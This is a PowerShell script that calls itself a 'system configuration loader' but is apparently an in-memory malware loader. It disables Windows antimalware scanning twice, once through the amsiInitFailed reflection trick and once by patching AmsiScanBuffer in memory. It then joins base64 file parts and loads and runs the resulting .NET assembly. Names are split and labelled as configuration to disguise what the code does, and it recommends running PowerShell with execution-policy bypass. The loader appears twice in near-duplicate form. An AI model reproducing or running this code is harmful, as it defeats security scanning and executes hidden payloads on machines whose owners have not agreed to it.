# System configuration loader
$a = $args

# Initialize system components
$x1='System.Management.Automation.'
$x2='AmsiUtils'
$x3='amsiInitFailed'
$x4='NonPublic,Static'
$y=$x1+$x2;$z=[Ref].Assembly.GetType($y).GetField($x3,$x4);$z.SetValue($null,$true)

Write-Host "System initialized"

# Check platform
$p = if ([System.Environment]::Is64BitProcess) { "x64" } else { "x86" }
Write-Host "Platform: $p"

# Load configuration data
Write-Host "Loading configuration files..."
$data = ""
$count = 0

# Process configuration parts
for ($i = 1; $i -le 200; $i++) {
    $file = "base64.txt.part{0:D3}" -f $i
    
    if (Test-Path $file) {
        $content = Get-Content -Path $file -Raw
        if ($content) {
            $data += $content.Trim()
            $count++
        }
    } else {
        break
    }
}

Write-Host "Processed $count configuration files"

if ($count -eq 0) {
    Write-Error "Configuration files not found"
    exit 1
}

if ($data.Length -eq 0) {
    Write-Error "Configuration data empty"
    exit 1
}

Write-Host "Configuration size: $($data.Length) chars"

# Process configuration
Write-Host "Processing configuration..."
$config = [System.Convert]::FromBase64String($data)
Write-Host "Processed size: $($config.Length) bytes"

try {
    # Load system module
    $mod = [System.Reflection.Assembly]::Load($config)
    
    # Execute system function
    $func = $mod.EntryPoint
    $params = [string[]]$a
    Write-Host "Executing with params: $($params -join ' ')"
    $func.Invoke($null, @(,$params))
}
catch [System.BadImageFormatException] {
    Write-Host ""
    Write-Host "Platform mismatch error" -ForegroundColor Red
    Write-Host "Current platform: $p" -ForegroundColor Yellow
    Write-Host ""
    Write-Host "Solutions:" -ForegroundColor Green
    if ($p -eq "x64") {
        Write-Host "Try x86 platform:" -ForegroundColor Green
        Write-Host "C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe -exec bypass" -ForegroundColor Cyan
    } else {
        Write-Host "Try x64 platform:" -ForegroundColor Green
        Write-Host "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -exec bypass" -ForegroundColor Cyan
    }
}
catch {
    Write-Host "Processing error: $($_.Exception.Message)" -ForegroundColor Red
}

# Data processing utility
$params = $args

# Load system utilities
$code1 = 'using System;'
$code2 = 'using System.Runtime.InteropServices;'
$code3 = 'namespace Utilities {'
$code4 = 'public class SystemPatch {'
$code5 = '[DllImport("kernel32")] public static extern IntPtr LoadLibrary(string name);'
$code6 = '[DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);'
$code7 = '[DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);'
$code8 = '[DllImport("kernel32.dll", EntryPoint = "RtlMoveMemory", SetLastError = false)] static extern void MoveMemory(IntPtr dest, IntPtr src, int size);'
$code9 = 'public static int Apply() {'

$lib1 = 'amsi'
$lib2 = '.dll'
$func1 = 'AmsiScan'
$func2 = 'Buffer'
$target = $lib1 + $lib2
$function = $func1 + $func2

$code10 = "IntPtr lib = LoadLibrary(`"$target`");"
$code11 = 'if (lib == IntPtr.Zero) { Console.WriteLine("Library load failed"); return 1; }'
$code12 = "IntPtr func = GetProcAddress(lib, `"$function`");"
$code13 = 'if (func == IntPtr.Zero) { Console.WriteLine("Function not found"); return 1; }'
$code14 = 'UIntPtr size = (UIntPtr)4; uint old = 0;'
$code15 = 'if (!VirtualProtect(func, size, 0x40, out old)) { Console.WriteLine("Protection change failed"); return 1; }'
$code16 = 'Byte[] patch = { 0x31, 0xff, 0x90 };'
$code17 = 'IntPtr ptr = Marshal.AllocHGlobal(3); Marshal.Copy(patch, 0, ptr, 3);'
$code18 = 'MoveMemory(func + 0x001b, ptr, 3);'
$code19 = 'Console.WriteLine("System patched successfully"); return 0; } } }'

$fullCode = $code1 + "`n" + $code2 + "`n" + $code3 + "`n" + $code4 + "`n" + $code5 + "`n" + $code6 + "`n" + $code7 + "`n" + $code8 + "`n" + $code9 + "`n" + $code10 + "`n" + $code11 + "`n" + $code12 + "`n" + $code13 + "`n" + $code14 + "`n" + $code15 + "`n" + $code16 + "`n" + $code17 + "`n" + $code18 + "`n" + $code19

try {
    Add-Type -TypeDefinition $fullCode
    $result = [Utilities.SystemPatch]::Apply()
    if ($result -eq 0) {
        Write-Host "System utilities loaded successfully"
    }
} catch {
    Write-Host "Utility loading failed, continuing with standard methods"
}

# Check system architecture
$arch = if ([System.Environment]::Is64BitProcess) { "x64" } else { "x86" }
Write-Host "System architecture: $arch"

# Read configuration segments
Write-Host "Reading configuration segments..."
$config = ""
$segments = 0

for ($i = 1; $i -le 200; $i++) {
    $segment = "base64.txt.part{0:D3}" -f $i
    
    if (Test-Path $segment) {
        $data = Get-Content -Path $segment -Raw
        if ($data) {
            $config += $data.Trim()
            $segments++
        }
    } else {
        break
    }
}

Write-Host "Loaded $segments configuration segments"

if ($segments -eq 0) {
    Write-Error "No configuration segments found"
    exit 1
}

Write-Host "Configuration length: $($config.Length) characters"

# Process configuration data
$binary = [System.Convert]::FromBase64String($config)
Write-Host "Binary size: $($binary.Length) bytes"

try {
    # Load and execute
    $assembly = [System.Reflection.Assembly]::Load($binary)
    $entry = $assembly.EntryPoint
    $args = [string[]]$params
    Write-Host "Executing with parameters: $($args -join ' ')"
    $entry.Invoke($null, @(,$args))
}
catch [System.BadImageFormatException] {
    Write-Host "Architecture mismatch detected" -ForegroundColor Red
    Write-Host "Current: $arch" -ForegroundColor Yellow
    if ($arch -eq "x64") {
        Write-Host "Try: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe -exec bypass" -ForegroundColor Cyan
    } else {
        Write-Host "Try: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -exec bypass" -ForegroundColor Cyan
    }
}
catch {
    Write-Host "Execution error: $($_.Exception.Message)" -ForegroundColor Red
}
